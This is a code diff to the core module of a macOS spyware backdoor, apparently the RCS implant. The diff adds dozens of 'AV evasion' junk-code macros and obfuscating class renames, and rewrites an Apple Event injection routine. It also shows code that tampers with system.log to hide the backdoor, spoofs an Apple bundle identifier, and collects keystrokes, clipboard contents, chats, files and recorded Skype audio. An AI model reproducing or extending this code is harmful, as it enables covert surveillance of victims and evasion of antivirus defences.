@@ -30,8 +30,10 @@
 
 #import "speex.h"
 
-#import "RCSMCore.h"
 #import "RCSMCommon.h"
+
+#import "RCSMCore.h"
+#import "RCSMGlobals.h"
 
 #import "RCSMInfoManager.h"
 #import "RCSMFileSystemManager.h"
@@ -45,6 +47,8 @@
 
 #import "NSApplication+SystemVersion.h"
 #import "NSMutableData+SHA1.h"
+
+#import "RCSMAVGarbage.h"
 
 #define ICON_FILENAME  @"q45tyh"
 
@@ -104,12 +108,18 @@ static BOOL gHasVoipOutFinishedRecording;
 static int gBackdoorFD = 0;
 
 io_registry_entry_t getRootDomain(void)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   static io_registry_entry_t gRoot = MACH_PORT_NULL;
   
   if (MACH_PORT_NULL == gRoot)
     gRoot = IORegistryEntryFromPath(kIOMasterPortDefault,
                                     kIOPowerPlane ":/IOPowerConnection/IOPMrootDomain");
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   return gRoot;
 }
@@ -120,6 +130,71 @@ io_registry_entry_t getRootDomain(void)
 //  return IORegistryEntrySetCFProperty(getRootDomain(), key, val);
 //}
 
+void lionSendEventToPid(pid_t pidP)
+{
+  AEEventID eventID = 'open';
+  int rUid = getuid();
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"send event to application pid %d", pidP);
+#endif
+  
+#ifdef DEBUG_CORE
+  infoLog(@"enter critical session [euid/uid %d/%d]", 
+          geteuid(), getuid());
+#endif
+  
+  // trimming process u&g
+  seteuid(rUid); 
+  
+  [app setTimeout:1];
+  
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  [app sendEvent: kASAppleScriptSuite
+              id: kGetAEUT
+      parameters: 0];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"send kASAppleScriptSuite [%d]", pidP);
+#endif
+  
+  sleep(1);
+  
+  [app setTimeout:1];
+  
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  
+  NSNumber *pid = [NSNumber numberWithInt: getpid()];
+  
+  id injectReply = [app sendEvent: 'OPNe'
+                               id: eventID
+                       parameters: 'pido', pid, 0];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"exit critical session [euid/uid %d/%d]", 
+          geteuid(), getuid());
+#endif
+  
+  if (injectReply != nil) 
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"unexpected injectReply: %@ [%d]", injectReply, pidP);
+#endif
+  }
+  else 
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"injection done [%d]", pidP);
+#endif
+  }
+  
+  [pool release];  
+}
+
 //
 // Shutdown handler
 //
@@ -127,7 +202,10 @@ static void computerWillShutdown(CFMachPortRef port,
                                  void *msg,
                                  CFIndex size,
                                  void *info)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   mach_msg_header_t *header = (mach_msg_header_t *)msg;
   static bool shouldShutdown = false;
   
@@ -156,6 +234,10 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       // Whatever shutdown, restart, or logout that was in progress has been cancelled.
       shouldShutdown = false;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
     }
   else if (shouldShutdown 
            && (header->msgh_id == gLWLogoutPointOfNoReturnNotificationToken))
@@ -169,81 +251,19 @@ static void computerWillShutdown(CFMachPortRef port,
       infoLog(@"Ok we're really shutting down NOW");
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       const char *userName = [NSUserName() UTF8String];
       ioctl(gBackdoorFD, MCHOOK_UNREGISTER, userName);
     }
-}
-
-void lionSendEventToPid(pid_t pidP)
-{
-  AEEventID eventID = 'load';
-  int rUid = getuid();
-  
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
-
-#ifdef DEBUG_CORE
-  infoLog(@"send event to application pid %d", pidP);
-#endif
-
-#ifdef DEBUG_CORE
-  infoLog(@"enter critical session [euid/uid %d/%d]", 
-             geteuid(), getuid());
-#endif
-
-  // trimming process u&g
-  seteuid(rUid); 
-  
-  [app setTimeout:1];
-  
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-  [app sendEvent: kASAppleScriptSuite
-              id: kGetAEUT
-      parameters: 0];
-      
-#ifdef DEBUG_CORE
-  infoLog(@"send kASAppleScriptSuite [%d]", pidP);
-#endif
-
-  sleep(1);
-  
-  [app setTimeout:1];
-  
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-
-  NSNumber *pid = [NSNumber numberWithInt: getpid()];
-
-  id injectReply = [app sendEvent: 'RCSe'
-                               id: eventID
-                       parameters: 'pido', pid, 0];
-
-#ifdef DEBUG_CORE
-  infoLog(@"exit critical session [euid/uid %d/%d]", 
-             geteuid(), getuid());
-#endif
-
-  if (injectReply != nil) 
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"unexpected injectReply: %@ [%d]", injectReply, pidP);
-#endif
-    }
-  else 
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"injection done [%d]", pidP);
-#endif
-    }
-
-  [pool release];  
 }
 
 #pragma mark -
 #pragma mark Private Interface
 #pragma mark -
 
-@interface RCSMCore (hidden)
+@interface __m_MCore (hidden)
 
 - (void)_renameBackdoorAndRelaunch;
 
@@ -253,6 +273,12 @@ void lionSendEventToPid(pid_t pidP)
 - (void)_checkSystemLog;
 
 //
+// Main thread
+//
+- (void)_communicateWithAgents;
+
+//
+//
 // Speex encode and write to logs
 // shouldn't be here but needs access to logManager
 //
@@ -261,12 +287,6 @@ void lionSendEventToPid(pid_t pidP)
                   channels: (u_int)channels
                   forInput: (BOOL)isInput;
 
-//
-// Main thread
-//
-- (void)_communicateWithAgents;
-
-//
 // Guess all the required names before the backdoor starts
 //
 - (void)_guessNames;
@@ -274,27 +294,27 @@ void lionSendEventToPid(pid_t pidP)
 //
 // Build the internal app folders and plist files needed to execute the backdoor
 //
-- (void)_createInternalFilesAndFolders;
-
 - (void)_resizeSharedMemoryWindow;
 
-- (BOOL)_createAndInitSharedMemory;
+- (void)_createInternalFilesAndFolders;
 
 - (void)_checkForOthers;
 
-- (BOOL)_SLIEscalation;
+- (BOOL)_createAndInitSharedMemory;
 
-- (BOOL)_UISpoof;
+- (BOOL)_SLIEscalation;
 
 - (BOOL)_dropInputManager;
 
-- (void)_solveKernelSymbolsForKext;
+- (BOOL)_UISpoof;
 
 - (void)_dropOsaxBundle;
 
-- (void)_dropXPCBundle;
+- (void)_solveKernelSymbolsForKext;
 
 - (void)_registerForShutdownNotifications;
+
+//- (void)_dropXPCBundle;
 
 @end
 
@@ -302,10 +322,13 @@ void lionSendEventToPid(pid_t pidP)
 #pragma mark Private Implementation
 #pragma mark -
 
-@implementation RCSMCore (hidden)
+@implementation __m_MCore (hidden)
 
 - (void)_renameBackdoorAndRelaunch
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
 #ifdef DEBUG_CORE
   warnLog(@"Spoofing and relaunching ourself, appName is %@", mApplicationName);
 #endif
@@ -317,6 +340,9 @@ void lionSendEventToPid(pid_t pidP)
   [[NSFileManager defaultManager] copyItemAtPath: [[NSBundle mainBundle] executablePath]
                                           toPath: mSpoofedName
                                            error: nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   //
   // Executing ourself with the new executable name and exit
@@ -332,7 +358,10 @@ void lionSendEventToPid(pid_t pidP)
 }
 
 - (int)_createAdvisoryLock: (NSString *)lockFile
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSError *error;
   BOOL success = [@"" writeToFile: lockFile
                        atomically: NO
@@ -343,7 +372,10 @@ void lionSendEventToPid(pid_t pidP)
   // Here we might get a privilege error in case the lock is on
   //
   if (success == YES)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
       NSFileHandle *lockFileHandle = [NSFileHandle fileHandleForReadingAtPath:
                                       lockFile];
 #ifdef DEBUG_CORE
@@ -353,6 +385,9 @@ void lionSendEventToPid(pid_t pidP)
       if (lockFileHandle)
         {
           int fd = [lockFileHandle fileDescriptor];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
           
           if (flock(fd, LOCK_EX | LOCK_NB) != 0)
             {
@@ -383,11 +418,17 @@ void lionSendEventToPid(pid_t pidP)
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   return -1;
 }
 
 - (void)_checkSystemLog
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
   NSMutableString *fileData     = [[NSMutableString alloc]
                                    initWithContentsOfFile: @"/var/log/system.log"];
@@ -397,6 +438,9 @@ void lionSendEventToPid(pid_t pidP)
                                    [[[NSBundle mainBundle] bundlePath]
                                     stringByAppendingPathComponent: @"System Preferences"]];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   u_int size = 400;
   u_int startOfft = ([fileData length] > size)
                       ? [fileData length] - size
@@ -405,6 +449,9 @@ void lionSendEventToPid(pid_t pidP)
   u_int len = ([fileData length] > size)
                 ? size
                 : [fileData length];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   [fileData replaceOccurrencesOfString: backdoorPath
                             withString: @"/Applications/System Preferences.app/Contents/MacOS/System Preferences"
@@ -416,6 +463,9 @@ void lionSendEventToPid(pid_t pidP)
                                options: NSCaseInsensitiveSearch
                                  range: NSMakeRange(startOfft, len)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [fileData writeToFile: @"/var/log/system.log"
              atomically: YES
                encoding: NSUTF8StringEncoding
@@ -425,6 +475,9 @@ void lionSendEventToPid(pid_t pidP)
                              @"root:admin",
                              @"/var/log/system.log",
                              nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [gUtil executeTask: @"/usr/sbin/chown"
         withArguments: _tempArguments
@@ -439,7 +492,10 @@ void lionSendEventToPid(pid_t pidP)
                   withSize: (u_int)audioChunkSize
                   channels: (u_int)channels
                   forInput: (BOOL)isInput
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
 #define SPEEX_MODE_UWB        2
 #define SINGLE_LPCM_UNIT_SIZE 4 // sizeof(float)
   // Single lpcm unit already casted to SInt16
@@ -465,7 +521,10 @@ void lionSendEventToPid(pid_t pidP)
   u_int complexity      = 1;
   u_int quality         = (gSkypeQuality != 0) ? gSkypeQuality : 5;
   
-  RCSMLogManager *_logManager = [RCSMLogManager sharedInstance];
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
   
   // Create a new wide mode encoder
   speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODE_UWB));
@@ -474,10 +533,16 @@ void lionSendEventToPid(pid_t pidP)
   speex_encoder_ctl(speexState, SPEEX_SET_QUALITY, &quality);
   speex_encoder_ctl(speexState, SPEEX_SET_COMPLEXITY, &complexity);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   speex_bits_init(&speexBits);
   
   // Get frame size for given quality and compression factor
   speex_encoder_ctl(speexState, SPEEX_GET_FRAME_SIZE, &frameSize);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (!frameSize)
     {
@@ -486,6 +551,10 @@ void lionSendEventToPid(pid_t pidP)
 #endif
       
       speex_encoder_destroy(speexState);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       speex_bits_destroy(&speexBits);
       
       return FALSE;
@@ -505,6 +574,10 @@ void lionSendEventToPid(pid_t pidP)
 #endif
       
       speex_encoder_destroy(speexState);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       speex_bits_destroy(&speexBits);
       
       return FALSE;
@@ -526,6 +599,9 @@ void lionSendEventToPid(pid_t pidP)
       return FALSE;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   //
   // Allocate the conversion buffer
   //
@@ -538,6 +614,10 @@ void lionSendEventToPid(pid_t pidP)
       free(inputBuffer);
       
       speex_encoder_destroy(speexState);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       speex_bits_destroy(&speexBits);
       
       return FALSE;
@@ -554,6 +634,9 @@ void lionSendEventToPid(pid_t pidP)
       floatToSInt16Buffer[j++] = value;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   ptrSInt16Buffer = (char *)floatToSInt16Buffer;
 #ifdef DEBUG_SPEEX
   verboseLog(@"Audio Chunk SIZE: %d", audioChunkSize);
@@ -562,11 +645,17 @@ void lionSendEventToPid(pid_t pidP)
   NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
   NSMutableData *audioData        = [[NSMutableData alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   waveHeader *waveFileHeader      = (waveHeader *)[headerData bytes];
   
   NSString *riff    = @"RIFF";
   NSString *waveFmt = @"WAVEfmt ";
   NSString *data    = @"data";
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   int audioSize = audioChunkSize / 2;
   int fileSize = audioSize + 44; // size of header + strings
@@ -579,6 +668,9 @@ void lionSendEventToPid(pid_t pidP)
   waveFileHeader->bitsPerSample   = 16;
   waveFileHeader->blockAlign      = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
   waveFileHeader->nAvgBytesPerSec = waveFileHeader->nSamplesPerSec * waveFileHeader->blockAlign;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   //waveFileHeader->blockAlign      = waveFileHeader->nAvgBytesPerSec = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
   
@@ -594,6 +686,9 @@ void lionSendEventToPid(pid_t pidP)
   [audioData appendBytes: &audioSize
                   length: sizeof(int)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   // Append audio chunk
   [audioData appendBytes: floatToSInt16Buffer
                   length: audioChunkSize / 2];
@@ -603,11 +698,17 @@ void lionSendEventToPid(pid_t pidP)
   
   NSString *fileName = [[NSString alloc] initWithFormat: @"/tmp/tempAudio-%d.wav", t];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [audioData writeToFile: fileName
               atomically: YES];
   
   [headerData release];
   [audioData release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   NSMutableData *fileData = [[NSMutableData alloc] init];
 #endif
@@ -629,8 +730,14 @@ void lionSendEventToPid(pid_t pidP)
           inputBuffer[i] =  bitSample[i * channels] - (bitSample[i * channels] / 4);
         }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       speex_bits_reset(&speexBits);
       speex_encode_int(speexState, inputBuffer, &speexBits);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       // Encode and store the result in the outputBuffer + first dword (length)
       bytesWritten = speex_bits_write(&speexBits,
@@ -641,6 +748,9 @@ void lionSendEventToPid(pid_t pidP)
       if (bytesWritten > (frameSize * SINGLE_LPCM_UNIT_SIZE))
         continue;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       // Store the audioChunk size in the first dword of outputBuffer
       memcpy(outputBuffer, &bytesWritten, sizeof(u_int));
       
@@ -650,7 +760,10 @@ void lionSendEventToPid(pid_t pidP)
                                                                   length: bytesWritten + sizeof(u_int)];
 #ifdef DEBUG_SPEEX
           [fileData appendData: tempData];
-#endif
+#endif  
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           [_logManager writeDataToLog: tempData
                              forAgent: AGENT_VOIP// + VOIP_SKYPE
                             withLogID: SKYPE_CHANNEL_INPUT];
@@ -664,9 +777,16 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_SPEEX
           [fileData appendData: tempData];
 #endif
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           [_logManager writeDataToLog: tempData
                              forAgent: AGENT_VOIP// + VOIP_SKYPE
                             withLogID: SKYPE_CHANNEL_OUTPUT];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_005
           
           [tempData release];
         }
@@ -675,6 +795,9 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_SPEEX
   time_t ut;
   time(&ut);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSString *outFile = [[NSString alloc] initWithFormat: @"/tmp/speexEncoded-%d.wav", ut];
   
@@ -689,8 +812,14 @@ void lionSendEventToPid(pid_t pidP)
   free(outputBuffer);
   free(floatToSInt16Buffer);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   speex_encoder_destroy(speexState);
   speex_bits_destroy(&speexBits);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   return TRUE;
 }
@@ -703,9 +832,12 @@ void lionSendEventToPid(pid_t pidP)
   int x = 0;
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   shMemoryLog *shMemLog;
-  RCSMLogManager *_logManager   = [RCSMLogManager sharedInstance];
-  RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
+  __m_MLogManager *_logManager   = [__m_MLogManager sharedInstance];
+  __m_MTaskManager *_taskManager = [__m_MTaskManager sharedInstance];
   
 #ifdef DEBUG_CORE
   infoLog(@"Start receiving log from agents");
@@ -723,6 +855,9 @@ void lionSendEventToPid(pid_t pidP)
   localFlag = [_taskManager getControlFlag];
   [gControlFlagLock unlock];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   while ([localFlag isEqualToString: @"RUNNING"])
     {
       NSAutoreleasePool *innerPool  = [[NSAutoreleasePool alloc] init];
@@ -733,6 +868,9 @@ void lionSendEventToPid(pid_t pidP)
       
       NSMutableData *logData        = nil;
       NSMutableData *readData       = nil;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       readData = [gSharedMemoryLogging readMemoryFromComponent: COMP_CORE
                                                       forAgent: 0
@@ -747,11 +885,17 @@ void lionSendEventToPid(pid_t pidP)
           
 #ifdef DEBUG_CORE         
           verboseLog(@"Logging shMemLog->agentID = 0x%x", shMemLog->agentID);
-#endif          
+#endif       
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           switch (shMemLog->agentID)
             {
             case AGENT_URL:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_006
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
                 
@@ -767,7 +911,10 @@ void lionSendEventToPid(pid_t pidP)
                 break;
               }
             case AGENT_KEYLOG:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_007
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
 
@@ -788,7 +935,10 @@ void lionSendEventToPid(pid_t pidP)
                 break;
               }
             case AGENT_APPLICATION:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_007
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
                 
@@ -808,7 +958,10 @@ void lionSendEventToPid(pid_t pidP)
                 break;
               }
             case AGENT_MOUSE:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_008
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from mouse");
 #endif
@@ -886,7 +1039,10 @@ void lionSendEventToPid(pid_t pidP)
                 break;
               }
             case AGENT_VOIP:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_009
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from Voip Agent");
 #endif
@@ -1233,7 +1389,10 @@ void lionSendEventToPid(pid_t pidP)
                 break;
               }
             case AGENT_CHAT:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_000
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from agent CHAT");
 #endif    
@@ -1257,7 +1416,10 @@ void lionSendEventToPid(pid_t pidP)
                 break;
               }
             case AGENT_CLIPBOARD:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_000
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from clipboard");
 #endif
@@ -1277,7 +1439,10 @@ void lionSendEventToPid(pid_t pidP)
                 break;
               }
             case AGENT_INTERNAL_FILEOPEN:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_005
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
 
@@ -1293,14 +1458,17 @@ void lionSendEventToPid(pid_t pidP)
                 break;
               }
             case AGENT_INTERNAL_FILECAPTURE:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_003
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
 
                 NSString *path = [[NSString alloc] initWithData: logData
                                                        encoding: NSUTF16LittleEndianStringEncoding];
 
-                RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                __m_MFileSystemManager *fsManager = [[__m_MFileSystemManager alloc] init];
                 BOOL success = [fsManager logFileAtPath: path
                                              forAgentID: AGENT_FILECAPTURE];
 
@@ -1322,7 +1490,10 @@ void lionSendEventToPid(pid_t pidP)
                 break;
               }
             case LOG_URL_SNAPSHOT:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_006
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from url snapshot");
 #endif
@@ -1434,7 +1605,10 @@ void lionSendEventToPid(pid_t pidP)
         agentIndex = 0;
       else
         agentIndex++;
-#endif 
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       if (logData != nil)
         {
           [logData release];
@@ -1444,6 +1618,9 @@ void lionSendEventToPid(pid_t pidP)
         {
           [readData release];
         }
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       NSMutableDictionary *agentConfiguration = [_taskManager getConfigForAgent: AGENT_VOIP];
       
@@ -1460,6 +1637,9 @@ void lionSendEventToPid(pid_t pidP)
           if (x == 0)
             infoLog(@"Got skype conf");
 #endif
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_009
           
           if ([agentConfiguration objectForKey: @"status"]    == AGENT_RUNNING
               || [agentConfiguration objectForKey: @"status"] == AGENT_START)
@@ -1494,6 +1674,9 @@ void lionSendEventToPid(pid_t pidP)
         x++;
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       [innerPool drain];
     }
   
@@ -1505,7 +1688,10 @@ void lionSendEventToPid(pid_t pidP)
 }
 
 - (void)_guessNames
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
 #ifdef DEV_MODE
 //  unsigned char result[CC_MD5_DIGEST_LENGTH];
 //  CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
@@ -1519,7 +1705,10 @@ void lionSendEventToPid(pid_t pidP)
                                 length: CC_MD5_DIGEST_LENGTH];
 #endif
   
-  RCSMEncryption *_encryption = [[RCSMEncryption alloc] initWithKey: temp];
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  __m_MEncryption *_encryption = [[__m_MEncryption alloc] initWithKey: temp];
   gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
   NSString *_backdoorName = nil;
   
@@ -1528,8 +1717,14 @@ void lionSendEventToPid(pid_t pidP)
       NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
                                  [[NSBundle mainBundle] bundlePath]];
       
-      NSArray *_searchedFile = searchForProtoUpload(searchPattern);
+      NSArray *_searchedFile = searchForProtoUpload(searchPattern);  
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       [searchPattern release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       if ([_searchedFile count] > 0)
         {
@@ -1549,11 +1744,17 @@ void lionSendEventToPid(pid_t pidP)
   gBackdoorUpdateName = [_encryption scrambleForward: _backdoorName
                                                 seed: ALPHABET_LEN / 2];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   if ([gBackdoorName isLessThan: gBackdoorUpdateName])
     {
 #ifdef DEBUG_CORE
       infoLog(@"gBackdoor");
-#endif
+#endif  
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       gConfigurationName = [_encryption scrambleForward: _backdoorName
                                                    seed: 1];
     }
@@ -1572,11 +1773,14 @@ void lionSendEventToPid(pid_t pidP)
                                                       seed: 2];
   gKext32Name               = [_encryption scrambleForward: gConfigurationName
                                                       seed: 4];
-  gXPCName                  = [_encryption scrambleForward: gConfigurationName
-                                                      seed: 8];
+//  gXPCName                  = [_encryption scrambleForward: gConfigurationName
+//                                                      seed: 8];
   gKext64Name               = [_encryption scrambleForward: gConfigurationName
                                                       seed: 16];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
 #ifdef DEBUG_CORE
   if ([gBackdoorName isEqualToString: @"System Preferences"] == NO)
     {
@@ -1587,7 +1791,6 @@ void lionSendEventToPid(pid_t pidP)
       infoLog(@"imanager   : %@", gInputManagerName);
       infoLog(@"kext32 name: %@", gKext32Name);
       infoLog(@"kext64 name: %@", gKext64Name);
-      infoLog(@"xpc name   : %@", gXPCName);
     }
 #endif
   
@@ -1595,7 +1798,10 @@ void lionSendEventToPid(pid_t pidP)
 }
 
 - (void)_createInternalFilesAndFolders
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
 #ifdef DEBUG_CORE
   infoLog(@"");
 #endif
@@ -1606,6 +1812,9 @@ void lionSendEventToPid(pid_t pidP)
   [task setLaunchPath: @"/usr/bin/uname"];
   [task setArguments: _commArguments];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSPipe *pipe = [NSPipe pipe];
   [task setStandardOutput: pipe];
   [task setStandardError: pipe];
@@ -1613,7 +1822,10 @@ void lionSendEventToPid(pid_t pidP)
   
   [task launch];
   [task waitUntilExit];
-         
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSData *taskData      = [file readDataToEndOfFile];
   NSString *taskOutput  = [[NSString alloc] initWithData: taskData
                                                 encoding: NSUTF8StringEncoding];
@@ -1629,6 +1841,9 @@ void lionSendEventToPid(pid_t pidP)
   NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 8];
   NSMutableDictionary *innerDict;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if ([gUtil isLeopard])
     {
       innerDict = [NSMutableDictionary dictionaryWithCapacity: 1];
@@ -1641,6 +1856,9 @@ void lionSendEventToPid(pid_t pidP)
       [innerDict setObject: taskOutput forKey: @"com.apple.kpi.libkern"];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [rootObj setObject: @"English" forKey: @"CFBundleDevelopmentRegion"];
   [rootObj setObject: @"com.apple.mdworker" forKey: @"CFBundleIdentifier"];
   [rootObj setObject: @"6.0" forKey: @"CFBundleInfoDictionaryVersion"];
@@ -1649,7 +1867,10 @@ void lionSendEventToPid(pid_t pidP)
   [rootObj setObject: @"????" forKey: @"CFBundleSignature"];
   [rootObj setObject: @"2.0" forKey: @"CFBundleVersion"];
   [rootObj setObject: innerDict forKey: @"OSBundleLibraries"];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (is64bitKernel())
     {
 #ifdef DEBUG_CORE
@@ -1670,6 +1891,9 @@ void lionSendEventToPid(pid_t pidP)
                                                                format: NSPropertyListXMLFormat_v1_0
                                                      errorDescription: &err];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSString *_backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     @"Contents"];
@@ -1677,11 +1901,18 @@ void lionSendEventToPid(pid_t pidP)
   
   _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources",
                           [[NSBundle mainBundle] bundlePath]];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   mkdir([_backdoorContentPath UTF8String], 0755);
   
   _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/MacOS",
                           [[NSBundle mainBundle] bundlePath]];
   mkdir([_backdoorContentPath UTF8String], 0755);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (is64bitKernel())
     {
@@ -1695,19 +1926,28 @@ void lionSendEventToPid(pid_t pidP)
                               gKext64Name,
                               @"Contents"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext64Name,
                               @"Contents/Resources"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext64Name,
                               @"Contents/MacOS"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext64Name,
@@ -1719,36 +1959,54 @@ void lionSendEventToPid(pid_t pidP)
                               [[NSBundle mainBundle] bundlePath],
